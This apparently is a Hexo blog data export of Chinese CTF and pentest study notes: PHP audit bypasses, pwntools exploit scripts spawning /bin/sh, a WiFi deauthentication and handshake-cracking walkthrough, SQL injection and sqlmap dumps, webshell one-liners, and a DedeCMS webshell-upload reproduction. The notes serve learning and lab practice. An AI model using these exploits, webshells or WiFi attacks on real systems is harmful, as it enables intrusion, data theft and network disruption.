{"meta":{"title":"Hexo","subtitle":null,"description":null,"author":"John Doe","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"bugku之代码审计","slug":"bugku之代码审计","date":"2019-09-10T08:05:30.000Z","updated":"2019-09-11T08:59:08.986Z","comments":true,"path":"2019/09/10/bugku之代码审计/","link":"","permalink":"http://yoursite.com/2019/09/10/bugku之代码审计/","excerpt":"","text":"#extract变量覆盖 extract函数，从数组中将变量导入到当前的符号表；该函数使用数组简明作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的的一个变量。那么这里的关键点就是shiyan和flag这两个变量了。只要我们让他们一致就ok了我们使用置空的方式让他们的值相等就ok了。flag=&amp;shiyan= #strcmp比较字符串 分析代码，可知只需使变量a等于flag即可输出flag，strcmp()函数只有在相等的情况下返回0。那么我们传入一个数组，它会返回NULL，而判断使用了==，而NULL==0是bool(true)，这样就成功绕过。 #urldecode二次编码绕过 &lt;?php if(eregi(“hackerDJ”,$_GET[id])) { echo(“ not allowed! &quot;); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == &quot;hackerDJ&quot;) { echo &quot; Access granted! &quot;; echo &quot; flag &quot;; } ?&gt;若想输出flag，变量id进行一次url编码后等于”hackerDJ”但是，变量id和”hackerDJ”进行正则表达式匹配，id不能等于”hackerDJ”，题目提醒两次url编码，可以使id=%2568ackerDJ浏览器会自动进行一次url编码，%25-&gt;% 此时id=%68ackerDJ第二次编码，%68-&gt;h 此时id=hackerDJ这样就可以绕过得flag #md5()函数 md5()函数遇到数组会返回空，所以可以构造两个数组，这样就有null===null username[]=1&amp;password[]=2#数组返回null绕过 &lt;?php $flag = “flag”; if (isset ($_GET[&apos;password&apos;])) { if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE) //正则表达式匹配 echo &apos;You password must be alphanumeric&apos;; else if (strpos ($_GET[&apos;password&apos;], &apos;--&apos;) !== FALSE) //查找字符串首次出现的位置 die(&apos;Flag: &apos; . $flag); else echo &apos;Invalid password&apos;; } ?&gt;题目提醒，数组时解题关键数组可以绕过ereg()函数，strpos()函数，遇到数组，返回的是nullnull===FALSE不成立，null!==FALSE成立，成功绕过 password[]=1这道题，还可以用%00截断首次这道题要求变量password中不能有除大小写、数字外的字符，下面又用strpos函数，要求password中含有–，读取字符串string时,如果遇到了%00,后面的字符串就不会被解析，故可用password=aA5%00– #弱类型整数大小比较绕过 $temp = $_GET[‘password’]; is_numeric($temp)?die(“no numeric”):NULL; if($temp&gt;1336){ echo $flag; 首先这道题要求password不能是数字，又要求password大于1336对于弱比较，若字符串以数字开头，则取开头数字作为转换结果，若无则输出0password=1337a #sha()函数比较绕过 &lt;?php $flag = “flag”; if (isset($_GET[‘name’]) and isset($_GET[‘password’])) { var_dump($_GET[‘name’]); echo “ “; var_dump($_GET[‘password’]); var_dump(sha1($_GET[‘name’])); var_dump(sha1($_GET[‘password’])); if ($_GET[‘name’] == $_GET[‘password’]) echo ‘ Your password can not be your name! &apos;; else if (sha1($_GET[&apos;name&apos;]) === sha1($_GET[&apos;password&apos;])) //这里传入两个不同的数组就行 die(&apos;Flag: &apos;.$flag); else echo &apos; Invalid password. &apos;; } else echo &apos; Login first! &apos;; ?&gt;md5()与sha1()同样，处理数组时，会返回空 name[]=1&amp;password[]=2 #md5加密相等绕过 如果知道MD5碰撞的概念，同时知道了在PHP中的MD5中的0e的比较，这道题目就十分的简单。 如果md的值是以0e开头的，那么就与其他的0e开头的Md5值是相等的。例子如下： md5(‘s878926199a’)=0e545993274517709034328855841020md5(‘s155964671a’)=0e342768416822451524974117254469 //可以看到两者的md5值都是以0e开头的，则 md5(‘s878926199a’)==md5(‘s155964671a’) //就是Truephp关于==号是这样处理的，如果一边是整型，另一边也需要是整型。 ($a != ‘QNKCDZO’ &amp;&amp; $md51 == $md52) 发现 $a != ‘QNKCDZO’ 并且 $md51 == $md52 因为$md51 = md5(‘QNKCDZO’)=0e830400451993494058024219903391 根据上文介绍，我们发现只要满足md5加密后为 “0e***“就可以a=s878926199a参考链接https://blog.csdn.net/qq_42777804/article/details/98512753 #十六进制与数字比较 preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母 foreach ($ps as $pt) { if (preg_match(\"/[[:$pt:]]+/\", $password)) $c += 1; } if ($c < 3) break; //>=3，必须包含四种类型三种与三种以上 if (\"42\" == $password) echo $flag; else echo 'Wrong password'; exit; } } ?>","categories":[],"tags":[]},{"title":"kali暴力破解WiFi密码","slug":"kali-暴力破解WiFi密码","date":"2019-08-30T01:04:59.000Z","updated":"2019-08-30T01:30:34.682Z","comments":true,"path":"2019/08/30/kali-暴力破解WiFi密码/","link":"","permalink":"http://yoursite.com/2019/08/30/kali-暴力破解WiFi密码/","excerpt":"","text":"#kali暴力破解WiFi密码 我这里是用的虚拟机，在虚拟机里，无法用笔记本电脑自带的无线网卡（虚拟机里的系统只能用USB外接无线网卡），因此专门买了一个无线网卡首先在终端里执行 airmon-ngcheck kill// 杀死一切干扰无线网卡监听热点的信号 然后载入自已的网卡名，一般都为wlan0 airmon-ng start wlan0 激活无线网卡，此时无线网卡的名称将变为wlan0mon,之前为wlan0 ifconfig -a开始监听周围WiFi热点，显示各个WiFi热点 airdump-ng wlan0mon 接着选择一个目标，开始攻击 airodump-ng -c 频道(ch) –bssid bssid -w /root/hh（用来存储抓包的目录）网卡名（wlan0mon） 当用户与wifi路由器产生数据交换，发送握手包时，我们可以捕获到，但有时长时间用户不与wifi路由器进行交互，不产生握手包，这时，我们可以强制断开用户的wifi，破事用户重新连接，这时就会产生握手包，新建一个终端 airepaly-ng -0 0 -c 连接到WiFi的手机mac地址 -a bssid 网卡名（一般为wlan0mon） (0为用deauth洪水攻击WiFi设备的次数，0为无限，-0 5则攻击5次。攻击原理是：先让设备掉线，设备会再自动连接，并发这个自动连接过程会进行三次握手，会发送tcp包（里面包含加密的密码数据），我方伪装成WiFi热点去窃取该数据包。我方窃取后即可用字典穷举法暴力破解加密的WiFi密码) 最后使用aircrack-ng进行破解 aircrack-ng -w /usr/share/wordlists/rockyou.txt /root/hh-0.1.cap /usr/share/wordlists/rockyou.txt这个是所用密码字典的路径和文件名/root/hh-0.1.cap这个是我们所捕获的握手包的路径和文件名 参考文章：https://blog.csdn.net/qq_41203799/article/details/79945133","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2019-08-25T10:46:19.649Z","updated":"2019-07-19T07:23:44.181Z","comments":true,"path":"2019/08/25/hello-world/","link":"","permalink":"http://yoursite.com/2019/08/25/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"二进制之ctf基础pwn题","slug":"二进制之ctf基础pwn题","date":"2019-07-27T07:49:20.000Z","updated":"2019-08-05T08:24:33.858Z","comments":true,"path":"2019/07/27/二进制之ctf基础pwn题/","link":"","permalink":"http://yoursite.com/2019/07/27/二进制之ctf基础pwn题/","excerpt":"##做题大体思路首先可以看看是否有后门函数，有的话，直接通过后门函数拿到shell，若没有，可以选择构造后门函数；若后门函数行不通，可以考虑执行shellcode，但前提是程序没有打开NX保护；若程序开启了canare保护，就不能简单的覆盖栈，必须保证canary不变，可以考虑通过字符串格式化漏洞，找到这个canary的位置，然后再进行操作。","text":"##做题大体思路首先可以看看是否有后门函数，有的话，直接通过后门函数拿到shell，若没有，可以选择构造后门函数；若后门函数行不通，可以考虑执行shellcode，但前提是程序没有打开NX保护；若程序开启了canare保护，就不能简单的覆盖栈，必须保证canary不变，可以考虑通过字符串格式化漏洞，找到这个canary的位置，然后再进行操作。 ##level0 先用checksec查看一下保护机制，发现几乎没什么保护机制，并且是一个64位的程序用ida64打开这个题有一个后门函数callsystm，直接返回一个system(“/bin/sh”)也就是一个命令框，这就是我们想要的，所以不用再构造后门函数脚本如下： from pwn import* //导入pwntools工具包 p=remote(‘pwn2.jarvisoj.com’,9881) //建立一个远程连接 callsystem=0x0000000000400596 //后门函数的地址 payload=’a’(0x80+0x8)+p64(callsystem) //用’a’0x80填满buf及以下的空间，一直到ebp，然后用’a’*0x8填满ebp，ebp下面的函数地址就被填入后门函数的返回地址，这里要注意的是32位程序ebp的大小位0x4,64位的是0x8 p.sendlineafter(‘World\\n’,payload) //发送数据 p.interactive() //将控制权交给用户 ##level1 仍旧是用checksec查看，32位，几乎没开保护机制，关键是NX没开，意味着栈上的数据可执行，用ida打开，找到溢出点；这次没有后门函数，但是这个函数却调用了printf函数，输出了buf的地址，再结合着NX保护是关闭的，直接将shellcode写到buf中函数返回时直接跳转到buf位置，就可以执行shellcode，拿到控制权，脚本如下： from pwn import* p=remote(&quot;pwn2.jarvisoj.com&quot;,9877) sh=p.recvline()[14:-2]recvline()是接受一行数据,[14:-2]只是python里的一个切片,是”What’sthis:0xffee6c50?”里边的第14个到倒数第二个字符 stack_addr=int(sh,16)这里的text为buf的地址，只不过是字符型的，需要int（text，16）用16进制的方法转化为int型 payload=asm(shellcraft.sh()).ljust(0x88)+&quot;A&quot;*4+p32(stack_addr)asm(shellcraft.sh())是生成shellcode的，ljust（0x88）是把生成的修剪为长度为0x88的 p.sendline(payload) p.interactive()##level2 首先用checksec查看，这次NX打开了，不能执行shellcode了，用ida打开发现有_system函数，并且有/bin/sh/，可以构造后门函数，将函数返回地址用system的地址覆盖，将传入参数设置成”/bin/sh”, from pwn import* p=remote(&apos;pwn2.jarvisoj.com&apos;,9878) system_addr=0x08048320 sh_addr=0x0804A024 payload = &apos;a&apos; * (0x88 + 0x4) + p32(system_addr) + p32(0) + p32(sh_addr) p.sendline(payload) p.interactive()‘a’ * (0x88 + 0x4)覆盖buf和rbpp32(system_addr) 传system的地址到函数返回地址p32(0) 覆盖栈底p32(sh_addr) 传”/bin/sh”到system函数 ##level2_x64 和32位的思路相同，不同的是，传参的方式不同32位的是直接把参数放入栈里，而64位的是把参数放进寄存器里 from pwn import* p=remote(&apos;pwn2.jarvisoj.com&apos;,9882) system_addr=0x00000000004004C0 pop_addr=0x00000000004006b3 sh_addr=0x0000000000600A90 payload = &apos;a&apos; * (0x80 + 0x8)+ p64(pop_addr) + p64(sh_addr)+ p64(system_addr) p.send(payload) p.interactive()pop_addr 第一个参数存入的寄存器的地址，rdi的地址p64(pop_addr) + p64(sh_addr)+ p64(system_addr) 先把”/bin/sh”的地址放入寄存器，然后再传入system函数 可用 ROPgadget –binary level2_x64 –only “pop|ret” 指令找到rdi地址 ##level3先知道plt表和got表的一些相关知识。反编译的过程当中，我们经常会发现xxx@plt的函数，因为为了用户体验和cpu的利用率，编译的时候需要两个表来进行辅助，一个是got表另外一个是plt表。plt表是内部函数表，got表是全局函数表，两者是一一对应的关系，网上找到过一张图，描述的很形象。也就是说plt表里面放的是got表的地址，got表里面放的是函数的真实地址。（链接：https://www.jianshu.com/p/722bcf89c6c2） 这道题，在给出程序的同时，给出了一个libc库；先进行一下安全检查，NX保护打开，但是在程序中却没有发现后门函数，因此，要根据libc库构建一个；通过找libc库中未偏移的write函数地址，和程序中偏移后的write函数地址，得出偏移量，然后从libc库里找system函数和”/bin/sh/“的地址，加上偏移量，得到真正的地址，这样，后门函数构造完成from pwn import*p=remote(“pwn2.jarvisoj.com”,”9879”)elf=ELF(“level3”)plt_write=elf.plt[“write”]main_addr=0x08048484p.recvline()payload = “A” * 0x88 + “A” * 4 + p32(plt_write) + p32(main_addr) + p32(1) + p32(elf.got[“write”]) + p32(4)p.send(payload)write_addr=u32(p.recv(4))print “write_addr=”+hex(write_addr) libc=ELF(“libc-2.19.so”)bss_addr=0x0804a024libc_system=libc.symbols[“system”]libc_binsh=next(libc.search(“/bin/sh”))libc_write=libc.symbols[“write”] system_addr=write_addr-libc_write+libc_systembinsh_addr=write_addr-libc_write+libc_binshprint “system_addr=”+hex(system_addr) p.recvline() payload = “A” * 0x88 + “A” * 4 + p32(system_addr) + p32(0) + p32(binsh_addr)p.sendline(payload)p.interactive() ##level3_x64思路和level3相同，不同的仍然是64位和32位的传参区别from pwn import*p=remote(“pwn2.jarvisoj.com”,”9883”)elf=ELF(“level3”)plt_write=0x00000000004004B0main_addr=0x000000000040061Apop_rdi=0x00000000004006b3pop_rsi=0x00000000004006b1p.recvline()payload = “A” * 0x80 + “A” * 8 + p64(pop_rdi)+p64(1) +p64(pop_rsi)+ p64(0x0000000000600A58)+p64(0)+p64(plt_write) + p64(main_addr)p.send(payload)write_addr=u64(p.recv(8))print “write_addr=”+hex(write_addr)print hex(elf.got[“write”])libc_system=0x0000000000046590libc_binsh=0x0000000000180543libc_write=0x00000000000EF3B0 system_addr=write_addr-libc_write+libc_systembinsh_addr=write_addr-libc_write+libc_binshprint “system_addr=”+hex(system_addr) p.recvline() payload = “A” * 0x80 + “A” * 8 +p64(pop_rdi)+ p64(binsh_addr)+ p64(system_addr) + p64(0)p.sendline(payload)p.interactive() ##pwn1格式化字符串漏洞的远离：格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。 这道题用到的漏洞，字符串格式化漏洞；这里开启了canary保护，没有开启NX，可以执行shellcode这题的思路：首先通过字符串格式化漏洞，泄露出canary在栈中的地址，以便覆盖栈时保证相应的地址canary不变，然后在函数返回地址中填入shellcode的地址，然后把shellcode放入相应的地址from pwn import * shellcode=”\\x31\\xc0\\x31\\xd2\\x31\\xdb\\x31\\xc9\\x31\\xc0\\x31\\xd2\\x52\\x68\\x2f\\x2f” “\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x31\\xc0\\xb0” “\\x0b\\xcd\\x80\\n”context.log_level=’debug’p=process(“./pwn1”)//p=remote(‘172.16.80.240’,8000)p.recvuntil(‘name:’)p.sendline(‘%p.’40)leak_data=p.recvuntil(‘messages:’)address=leak_data.split(‘.’)for i in range(len(address)): print str(i)+’:’+str(address[i])canary=address[30]print “canary=”+canaryprev_ebp_addr=address[33]print “stack_addr=”+prev_ebp_addrshellcode_addr=int(prev_ebp_addr,16)-144+0x8payload=’a’100+p32(int(canary,16))+’A’*12+p32(shellcode_addr)+shellcodep.sendline(payload)p.interactive()","categories":[],"tags":[]},{"title":"ubuntu16下 pwntools的安装","slug":"pwntools的安装","date":"2019-07-23T03:22:12.000Z","updated":"2019-07-23T03:26:54.963Z","comments":true,"path":"2019/07/23/pwntools的安装/","link":"","permalink":"http://yoursite.com/2019/07/23/pwntools的安装/","excerpt":"","text":"sudo apt-get update sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essentia sudo pip install --upgrade pip -i http://pypi.douban.com/simple --trusted-host pypi.douban.com sudo pip install --upgrade pwntools -i http://pypi.douban.com/simple --trusted-host pypi.douban.com如果第四条指令报错的话，可以在最后加上 –user 试试；","categories":[],"tags":[]},{"title":"sql注入","slug":"sql注入","date":"2019-07-20T08:24:08.000Z","updated":"2019-08-07T11:36:34.361Z","comments":true,"path":"2019/07/20/sql注入/","link":"","permalink":"http://yoursite.com/2019/07/20/sql注入/","excerpt":"","text":"常用的系统函数1.version() –mysql版本2.user() –数据库用户名3.database() – 数据库名4.@@datadir –数据库路径5.@@version_compile_os –操作系统版本字符串连接符号 group_concat(Str1,str2,…) 连接一个组的所有字符串，并以逗号分隔每一条数据 ##sqli-labs-master## ###Less1###爆所有的数据库名 127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata%23 库名：information_schema,�����ݿ�,challenges,dedecmsv57utf8sp2,dvwa,mysql,performance_schema,security,test,wordpress 爆表名 127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’ –+表名：emails,referers,uagents,users 爆列名：127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ –+ 爆数据 127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,username,password from users where id=2–+ ###Less2","categories":[],"tags":[]},{"title":"WEB前端安全-XSS与CSRF","slug":"drops夏令营14","date":"2019-07-20T07:11:35.000Z","updated":"2019-07-20T07:24:20.490Z","comments":true,"path":"2019/07/20/drops夏令营14/","link":"","permalink":"http://yoursite.com/2019/07/20/drops夏令营14/","excerpt":"","text":"XSS XSS，Cross Site Script，即跨站脚本攻击；XSS攻击通常指黑客通过“HTML”注入篡改了网页，插入了恶意的脚本，从而在浏览网页时，控制用户浏览器的一种攻击。XSS根据效果的不同可以分为以下三类： 反射型XSS，也叫做“非持久型XSS”，只是简单的把用户输入的数据“反射”给浏览器； 存储型XSS，也叫做“持久型XSS”，会把用户输入的数据“存储在”服务器端。常见的场景是，黑客写下一篇含有恶意JavaScript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码； DOM Based XSS，从效果来说也是反射型XSS，单独划分出了是因为DOM Based XSS的形成原因比较特殊，通过修改页面的DOM节点形成的XSS XSS常见危害：劫持用户会话盗取cookie钓鱼欺骗强制弹出广告提升用户权限传播跨站脚本蠕虫 CSRFCSRF，Cross Site Request Forgery，即跨站点请求伪造；它是一种常见的Web攻击，也是Web安全中最容易被忽略的一种攻击方式它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户的请求来利用受信任的网站。 一般攻击方式为攻击者诱使用户访问了一个页面，就以该用户身份在第三方站点里执行了一次操作 CSRF攻击的两个重点 *CSRF的攻击建立在浏览器与web服务器的会话中*欺骗用户访问URL","categories":[],"tags":[]},{"title":"渗透测试工具","slug":"drops夏令营11","date":"2019-07-20T06:49:20.000Z","updated":"2019-07-20T08:00:59.768Z","comments":true,"path":"2019/07/20/drops夏令营11/","link":"","permalink":"http://yoursite.com/2019/07/20/drops夏令营11/","excerpt":"","text":"nmap(一款开源免费的网络发现（Network Discovery）和安全审计（Security Auditing）工具)SQLMAP(sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限)burpsuite(BurpSuite 是用于攻击web 应用程序的集成平台，包含了许多工具)hydra(Hydra是一款非常强大的暴力破解工具，它是由著名的黑客组织THC开发的一款开源暴力破解工具)中国菜刀 中国蚁剑（网站管理工具）御剑（一款好用的网站后台扫描工具）nessus（一款漏洞扫描程序）AWVS(一个自动化的web应用程序安全测试工具) nmap的基本功能主机发现、端口扫描、版本侦测、操作系统侦测 常用参数-A ：选项用于使用进攻性方式扫描-T4： 指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4-oX test.xml： 将扫描结果生成 test.xml 文件-oG test.txt: 将扫描结果生成 test.txt 文件-sn : 只进行主机发现，不进行端口扫描-O : 指定Nmap进行系统版本扫描-sV: 指定让Nmap进行服务版本扫描-p : 扫描指定的端口-sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描-sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况-Pn ： 不进行ping扫描-sP : 用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping-PI : 设置这个选项，让nmap使用真正的ping(ICMP echo请求)来扫描目标主机是否正在运行。-iL 1.txt : 批量扫描1.txt中的目标地址-sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现-sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况-sO: 使用IP protocol 扫描确定目标机支持的协议类型-PO : 使用IP协议包探测对方主机是否开启-PE/PP/PM : 使用ICMP echo、 ICMP timestamp、ICMP netmask 请求包发现主机-e eth0：指定使用eth0网卡进行探测-f : –mtu : 指定使用分片、指定数据包的 MTU.-b : 使用FTP bounce scan扫描方式-g： 指定发送的端口号-n : 表示不进行DNS解析；-S : 伪装成其他 IP 地址 扫描特定主机上的某些端口1.nmap -p 21,22,23,80,443 192.168.1.1 //扫描指定端口2.nmap -p 20-80 192.168.1.1 //扫描指定范围内的端口 sqlmap参数-p 指定测试参数-b 获取banner–dbs 列举数据库–is-dba 是否是管理员权限–current-db 当前数据库–current-user 当前用户–tables 列举数据库的表名–count 检索所有条目数–columns 获取表的列名–dump 获取表中的数据，包含列–dump-all 转存DBMS数据库所有表项目–level 测试等级(1-5)，默认为1-v 显示详细信息操作步骤读数据库-&gt;读取表-&gt;读取表的列-&gt; 获取内容-D 指定数据库 -T 指定表 -C指定列–dbms==mysql Oracle mysql 指定数据库 举例爆数据库 sqlmap –u “http://127.0.0.1/sqli-labs/Less-1/?id=1” –dbs当前数据库 sqlmap –u “http://127.0.0.1/sqli-labs/Less-1/?id=1” –current-db列举数据库的表名 sqlmap –u http://127.0.0.1/sqli-labs/Less-1/?id=1 –D security – tables列出表中的字段 sqlmap –u http://127.0.0.1/sqli-labs/Less-1/?id=1 –D security –T users –columns列出字段内容 sqlmap –u http://127.0.0.1/sqli-labs/Less-1?id=1 –D security –T users –C password –dump Burpsuite Proxy代理模块 Burpsuite默认使用8080端口作为代理，当然，你也可以自己修改端口号。Proxy——&gt;Options，然后下面可以自己修改代理的端口号，默认是8080这里 Proxy 的 Intercept 这里显示 Intercept is on 表示拦截包开启，所有代理的包都必须先经过burpsuite放行才可以走。如果这里我们选择 intercept is off 的话，那么所有的包都会经过burpsuite，可以在HTTP history看所有经过的包，但是burpsuite不会对经过的包进行拦截。 Repeater模块(改包，重放) 抓取包之后，右键 Send to Repeater 发送到重发模块在 Repeater模块，我们可以随意修改数据包。修改完后，点击 go ，就可以发包了。右边就会显示 服务器回的包。 中国蚁剑 中国菜刀 与一句话木马有关一句话木马就是只需要一行代码的木马，短短一行代码，就能做到和大马相当的功能。为了绕过waf的检测，一句话木马出现了无数中变形，但本质是不变的：木马的函数执行了我们发送的命令。 简单的一句话木马：PHP： Asp： &lt;%eval request (“pass”)%&gt;Aspx： &lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“pass”],”unsafe”);%&gt;","categories":[],"tags":[]},{"title":"漏洞复现","slug":"drops夏令营15","date":"2019-07-20T06:25:41.000Z","updated":"2019-07-20T06:37:28.150Z","comments":true,"path":"2019/07/20/drops夏令营15/","link":"","permalink":"http://yoursite.com/2019/07/20/drops夏令营15/","excerpt":"","text":"一、 dedeCMS漏洞的文件路径 DedeCMS-V5.7-UTF8-SP2\\uploads\\dede\\tpl.php漏洞的代码如下： else if($action==’savetagfile’){ csrf_check(); if(!preg_match(“#^[a-z0-9_-]{1,}.lib.php$#i”, $filename)) { ShowMsg(‘文件名不合法，不允许进行操作！’, ‘-1’); exit(); } require_once(DEDEINC.’/oxwindow.class.php’); $tagname = preg_replace(“#.lib.php$#i”, “”, $filename); $content = stripslashes($content); $truefile = DEDEINC.’/taglib/‘.$filename; $fp = fopen($truefile, ‘w’); fwrite($fp, $content);fclose($fp); 通过分析发现，因为没有对写入的内容做过滤，我们可以写一句话木马上传了 if(!preg_match(“#^[a-z0-9_-]{1,}.lib.php$#i”, $filename))Preg_match()函数是正则匹配的函数，里面写上匹配的规则，匹配所有包含一个以上的字母数字下划线和横杠，后面的.意思是匹配小数点，i表示大小写不敏感Preg_replaceStripslashes()该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。 UR输入 域名+/ DedeCMS-V5.7-UTF8-SP2/uploads/dede/tpl.php?action=upload获取 token然后输入action=savetagfile&amp;token=b87a7b8629b120fb009c8992cce7c68f&amp;filename=123.lib.php&amp;content= 上传一个123.lib.php文件，里边写着一句话木马 然后用蚁剑连上；","categories":[],"tags":[]},{"title":"ctf之MISC","slug":"drops夏令营13","date":"2019-07-19T07:31:31.000Z","updated":"2019-07-20T06:41:32.060Z","comments":true,"path":"2019/07/19/drops夏令营13/","link":"","permalink":"http://yoursite.com/2019/07/19/drops夏令营13/","excerpt":"","text":"流量分析文件格式分析隐写 图片 音频压缩包分析古典密码 流量分析（wireshark使用）………… ……常见文件头和文件尾的16进制编码：JPEG (jpg) 文件头：FFD8FF 文件尾：FF D9 PNG (png) 文件头：89504E47 文件尾：AE 42 60 82 GIF (gif) 文件头：47494638 文件尾：00 3B ZIP Archive (zip) 文件头：504B0304 文件尾：50 4B TIFF (tif)， 文件头：49492A00 RAR Archive (rar)， 文件头：52617221 Windows Bitmap (bmp)， 文件头：424DAdobe Photoshop (psd)， 文件头：38425053Rich Text Format (rtf)， 文件头：7B5C727466 XML (xml)， 文件头：3C3F786D6C HTML (html)， 文件头：68746D6C3EOutlook Express (dbx)， 文件头：CFAD12FEC5FD746FOutlook (pst)， 文件头：2142444EMS Word/Excel (xls.or.doc)， 文件头：D0CF11E0MS Access (mdb)， 文件头：5374616E64617264204AWordPerfect (wpd)， 文件头：FF575043Adobe Acrobat (pdf)， 文件头：255044462D312EQuicken (qdf)， 文件头：AC9EBD8F…… 文件分离的方法 除了用foremost外，还有binwalk、dd命令binwalk -e 文件名dd前面介绍的是自动化分离工具，dd这个工具是一种半自动化工具，有的时候自动化工具不能实现文件的分离，所以需要用这个工具来进行分离。使用dd命令分离文件格式如下：dd if=源文件名 of=输出文件名 skip=开始分离的字节数 bs=1；参数说明：if=file #输入文件名，缺省为标准输入。of=file #输出文件名，缺省为标准输出。bs=bytes #同时设置读写块的大小为 bytes ，可代替 ibs 和 obs 。skip=blocks #从输入文件开头跳过 blocks 个块后再开始复制。 Lsb隐写 和音频隐写（Audacity、MP3stego 使用）……。。。。。。 Zip伪加密问题 识别真假加密无加密压缩源文件数据区的全局加密应当为00 00且压缩源文件目录区的全局方式位标记应当为00 00假加密压缩源文件数据区的全局加密应当为00 00且压缩源文件目录区的全局方式位标记应当为09 00真加密压缩源文件数据区的全局加密应当为09 00且压缩源文件目录区的全局方式位标记应当为09 00第二个数字为奇数时 –&gt;加密第二个数字为偶数时 –&gt;未加密 对于伪加密有以下几种方法： 在Mac OS及部分Linux（如Kali）系统中，可以直接打开伪加密的zip压缩包 使用检测伪加密的ZipCenOp.jar，解密后如果能成功打开zip包，则是伪加密，否则说明思路错误。使用ZipCenOp.jar(需要java环境)，在cmd中使用java -jar ZipCenOp.jar -r xxx.zip 压缩包明文攻击 明文攻击是一种较为高效的攻击手段，大致原理是当你不知道一个zip的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件 ……。。。。。。 古典密码 凯撒密码栅栏密码棋盘密码希尔密码摩斯电码猪圈密码键盘密码当铺密码（http://www.zjslove.com/3.decode/dangpu/index.html）","categories":[],"tags":[]},{"title":"ctf之web安全","slug":"drops夏令营12","date":"2019-07-19T07:25:12.000Z","updated":"2019-07-20T06:40:42.946Z","comments":true,"path":"2019/07/19/drops夏令营12/","link":"","permalink":"http://yoursite.com/2019/07/19/drops夏令营12/","excerpt":"","text":"Web题目分类1.源码获取，扫描，弱密码爆破，js绕过 Php代码审计，弱类型比较 文件上传，文件包含 序列化和反序列化 Sql注入（必有） Xss跨站脚本攻击（难） 第一节web基础知识 X-Forwarded-For 是一个 HTTP 扩展头部，主要是为了让 Web 服务器获取访问用户的真实 IP 地址（其实这个真实未必是真实的，是自己写入的，完全由自己定夺，是自己想告诉服务器自己的IP地址）； Referer是告诉服务器你从哪里来，比如说从谷歌来； 源码获取，git 由于现在当前大量开发人员使用git进行版本控制，对站点自动部署。 如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，还原重建工程源代码。 扫描 有些网站的隐藏的文件，页面并不是能够发现，所以需要我们利用一些扫描工具进行扫描，得到隐藏的页面，得到关键的信息。常用的扫描软件：御剑，dirserach御剑在window下运用，而dirsearch需要在linux下进行扫描。Dirsearch扫描命令格式：./dirsearch –u 目标网址 –e*例如：./dirsearch –u htttps://www.baidu.com –e* 第二节 php代码审计 Extract变量覆盖Php弱类型比较二次url编码绕过哈希绕过正则绕过 第三节 文件上传 文件包含 本地js检验黑名单检验白名单内容检验竞争上传 本地包含远程文件 包含相关函数：Include（）Include_once（）require()Rquire_once() 第四节 序列化和反序列化 在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。序列化函数原型如下：string serialize ( mixed $value )对象的序列化主要有两种用途：1） 把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；2） 在网络上传送对象的字节序列。在很多应用中，需要对某些对象进行序列化，让它们离开内存空间，入住物理硬盘，以便长期保存。比如最常见的是Web服务器中的Session对象，当有 10万用户并发访问，就有可能出现10万个Session对象，内存可能吃不消，于是Web容器就会把一些seesion先序列化到硬盘中，等要用了，再把保存在硬盘中的对象还原到内存中。当两个进程在进行远程通信时，彼此可以发送各种类型的数据。无论是何种类型的数据，都会以二进制序列的形式在网络上传送。发送方需要把这个Java对象转换为字节序列，才能在网络上传送；接收方则需要把字节序列再恢复为Java对象。https://www.cnblogs.com/youyoui/p/8610068.html 魔术方法参考网站：https://php.net/manual/zh/language.oop5.magic.phpconstruct(), __destruct(), __call(), __callStatic(), __get(), __set(), __isset(), __unset(),__sleep(), __wakeup(), 